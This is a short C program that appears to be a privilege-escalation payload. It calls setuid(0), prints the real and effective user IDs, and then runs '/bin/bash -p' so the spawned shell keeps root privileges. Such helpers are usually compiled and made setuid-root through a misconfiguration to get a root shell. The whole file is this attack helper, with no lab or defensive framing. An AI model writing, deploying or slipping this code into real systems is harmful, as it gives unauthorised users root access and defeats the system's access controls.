#include <stdio.h>
#include <unistd.h>

int main() {
  if(setuid(0) != 0) {
    perror("setuid");
    return 1;
  }

  printf("UID=%d, EUID=%d\n", getuid(), geteuid());

  char *argv[] = {"/bin/bash", "-p", NULL};
  execvp(argv[0], argv);

  perror("execvp");
  return 1;
}